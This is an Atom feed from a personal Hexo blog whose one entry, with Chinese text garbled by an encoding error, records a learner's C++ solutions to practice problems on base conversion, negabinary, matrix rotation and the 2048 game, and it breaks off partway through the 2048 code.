<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sh1k4ku&#39;s blog</title>
  
  <subtitle>è®°å½•æˆ‘çš„å­¦ä¹ ä¹‹è·¯</subtitle>
  <link href="http://sh1k4ku.github.io/atom.xml" rel="self"/>
  
  <link href="http://sh1k4ku.github.io/"/>
  <updated>2023-07-05T01:12:15.732Z</updated>
  <id>http://sh1k4ku.github.io/</id>
  
  <author>
    <name>sh1k4ku</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ç®—æ³•åˆ·é¢˜è®°å½•</title>
    <link href="http://sh1k4ku.github.io/2023/06/08/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://sh1k4ku.github.io/2023/06/08/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2023-06-08T09:12:48.000Z</published>
    <updated>2023-07-05T01:12:15.732Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘æ˜¯ä»€ä¹ˆfwğŸ˜¢</p><span id="more"></span><p>[toc]</p><h1 id="å…¥é—¨"><a href="#å…¥é—¨" class="headerlink" title="å…¥é—¨"></a>å…¥é—¨</h1><h2 id="è¿›åˆ¶"><a href="#è¿›åˆ¶" class="headerlink" title="è¿›åˆ¶"></a>è¿›åˆ¶</h2><h3 id="åè¿›åˆ¶å’ŒäºŒè¿›åˆ¶"><a href="#åè¿›åˆ¶å’ŒäºŒè¿›åˆ¶" class="headerlink" title="åè¿›åˆ¶å’ŒäºŒè¿›åˆ¶"></a>åè¿›åˆ¶å’ŒäºŒè¿›åˆ¶</h3><p>ä»‹ç»ï¼šå¯¹äºä¸€ä¸ªåè¿›åˆ¶æ•°Aï¼Œå°†Aè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ï¼Œç„¶åæŒ‰ä½é€†åºæ’åˆ—ï¼Œå†è½¬æ¢ä¸ºåè¿›åˆ¶æ•°Bï¼Œæˆ‘ä»¬ç§°Bä¸ºAçš„äºŒè¿›åˆ¶é€†åºæ•°ã€‚   ä¾‹å¦‚å¯¹äºåè¿›åˆ¶æ•°173ï¼Œå®ƒçš„äºŒè¿›åˆ¶å½¢å¼ä¸º10101101ï¼Œé€†åºæ’åˆ—å¾—åˆ°10110101ï¼Œå…¶åè¿›åˆ¶æ•°ä¸º181ï¼Œ181å³ä¸º173çš„äºŒè¿›åˆ¶é€†åºæ•°ã€‚</p><p>é‡ç‚¹å°±æ˜¯å¤§æ•°çš„åè¿›åˆ¶å’ŒäºŒè¿›åˆ¶äº’è½¬ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">d2b</span><span class="params">(<span class="keyword">char</span> s[<span class="number">1000</span>])</span></span>&#123;</span><br><span class="line">    string result;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line">        num[i] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; len)&#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">        result += num[len<span class="number">-1</span>] % <span class="number">2</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len; j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = num[j];</span><br><span class="line">            num[j] = (num[j] + c) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(tmp % <span class="number">2</span> == <span class="number">1</span>) c = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">else</span> c = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num[i] == <span class="number">0</span>) i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">b2d</span><span class="params">(string sb)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = sb.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> upb = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> res_d[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">string result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; upb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">res_d[j] = res_d[j] * <span class="number">2</span> + (sb[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">res_d[j] = res_d[j] * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; upb; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(res_d[k] &gt; <span class="number">9</span>)&#123;</span><br><span class="line">res_d[k+<span class="number">1</span>]++;</span><br><span class="line">res_d[k] %= <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(k == upb - <span class="number">1</span>)&#123;</span><br><span class="line">upb ++ ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = upb - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">        string sb = <span class="built_in">d2b</span>(s);</span><br><span class="line">        <span class="built_in">reverse</span>(sb.<span class="built_in">begin</span>(), sb.<span class="built_in">end</span>());</span><br><span class="line">        string res = <span class="built_in">b2d</span>(sb);</span><br><span class="line">        cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è¿›åˆ¶è½¬æ¢M2N"><a href="#è¿›åˆ¶è½¬æ¢M2N" class="headerlink" title="è¿›åˆ¶è½¬æ¢M2N"></a>è¿›åˆ¶è½¬æ¢M2N</h3><p>å°±æ˜¯åœ¨Mè¿›åˆ¶è½¬åè¿›åˆ¶çš„æ—¶å€™æŠŠè¿›ä½çš„10æ”¹æˆnï¼ˆåè¿›åˆ¶è½¬Nè¿›åˆ¶å…¶å®æ²¡å¿…è¦å•ç‹¬å†™äº†ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">m2n</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n, string num)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = num.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> upb = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> res_d[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">string result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; upb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((num[i] - <span class="string">&#x27;0&#x27;</span>) &lt; <span class="number">10</span>)res_d[j] = res_d[j] * m + (num[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> res_d[j] = res_d[j] * m + (num[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">res_d[j] = res_d[j] * m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; upb; k++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(res_d[k] &gt; n<span class="number">-1</span>)&#123;</span><br><span class="line">res_d[k+<span class="number">1</span>] += res_d[k] / n;</span><br><span class="line">res_d[k] %= n;</span><br><span class="line"><span class="keyword">if</span>(k == upb - <span class="number">1</span>)&#123;</span><br><span class="line">upb ++ ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = upb - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(res_d[i] &gt; <span class="number">9</span>)&#123;</span><br><span class="line">result += (res_d[i] - <span class="number">10</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m, n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; m &gt;&gt; n)&#123;</span><br><span class="line">string m_num;</span><br><span class="line">cin &gt;&gt; m_num;</span><br><span class="line">string n_num = <span class="built_in">m2n</span>(m, n, m_num);</span><br><span class="line">cout &lt;&lt; n_num &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è´ŸäºŒè¿›åˆ¶"><a href="#è´ŸäºŒè¿›åˆ¶" class="headerlink" title="è´ŸäºŒè¿›åˆ¶"></a>è´ŸäºŒè¿›åˆ¶</h3><p>æ³¨æ„Cé‡Œé¢é™¤ä»¥-2çš„ä½™æ•°æœ‰å¥½å‡ ç§æƒ…å†µï¼Œ-1-0-1éƒ½æœ‰å¯èƒ½ï¼›</p><p>è¿˜æœ‰è¾¹ç•Œè¾“å…¥0è€ƒè™‘ä¸€ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ip;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; ip)&#123;</span><br><span class="line">string op;</span><br><span class="line"><span class="keyword">if</span>(ip == <span class="number">0</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(ip!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> r = ip % <span class="number">-2</span>, k = ip / <span class="number">-2</span>;</span><br><span class="line"><span class="keyword">if</span>(r == <span class="number">0</span>)&#123;</span><br><span class="line">ip = k;</span><br><span class="line">op += r + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r == <span class="number">-1</span>)&#123;</span><br><span class="line">ip = k+<span class="number">1</span>;</span><br><span class="line">op += r+<span class="number">2</span>+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r == <span class="number">1</span>)&#123;</span><br><span class="line">ip = k;</span><br><span class="line">op += r + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">reverse</span>(op.<span class="built_in">begin</span>(), op.<span class="built_in">end</span>());</span><br><span class="line">cout &lt;&lt; op &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h2><h3 id="æ—‹è½¬çŸ©é˜µ"><a href="#æ—‹è½¬çŸ©é˜µ" class="headerlink" title="æ—‹è½¬çŸ©é˜µ"></a>æ—‹è½¬çŸ©é˜µ</h3><p>å‡½æ•°è°ƒç”¨äºŒç»´æ•°ç»„å’Œè¿”å›æŒ‡é’ˆæœ‰ç‚¹æŠ˜ç£¨ï¼Œæœ€åè¿˜æ˜¯å®šä¹‰äº†å…¨å±€å˜é‡</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> data[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">one</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">data[i][j] = s[n-j<span class="number">-1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">s[i][j] = data[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">two</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">data[i][j] = s[j][m<span class="number">-1</span>-i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">s[i][j] = data[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">three</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">data[i][j] = s[i][m-j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">s[i][j] = data[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m, k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m &gt;&gt; k)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">cin &gt;&gt; s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> k_;</span><br><span class="line">cin &gt;&gt; k_;</span><br><span class="line"><span class="keyword">if</span>(k_ == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">one</span>(n, m);</span><br><span class="line"><span class="keyword">int</span> tmp = m;</span><br><span class="line">m = n;</span><br><span class="line">n = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(k_ == <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">two</span>(n, m);</span><br><span class="line"><span class="keyword">int</span> tmp = m;</span><br><span class="line">m = n;</span><br><span class="line">n = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(k_ == <span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">three</span>(n, m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">cout &lt;&lt; s[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>æˆ‘æ˜¯æ¯æ¬¡åç€éå†ï¼Œç„¶åæŠŠæ‰¾ä¸ä¸º0çš„å€¼ï¼Œå¦‚æœä¸‹ä¸€ä¸ªä¸ç›¸ç­‰å°±å­˜åœ¨ä¸€ä¸ªæ•°ç»„é‡Œï¼Œå¦‚æœæ‰¾åˆ°ç›¸ç­‰çš„å°±*2å†å­˜ã€‚æ¯æ¬¡æ‰¾åˆ°ä¸ç­‰äº0çš„å€¼ä¸€å®šè¦å­˜ï¼Œåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ã€‚</p><p>çœ‹åˆ«äººçš„ç­”æ¡ˆæ˜¯æ¯”è¾ƒè§„çŸ©çš„ï¼šå…ˆç§»åˆ°ä¸€ä¾§ï¼Œå†åˆå¹¶ï¼Œå†ç§»åˆ°ä¸€ä¾§ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 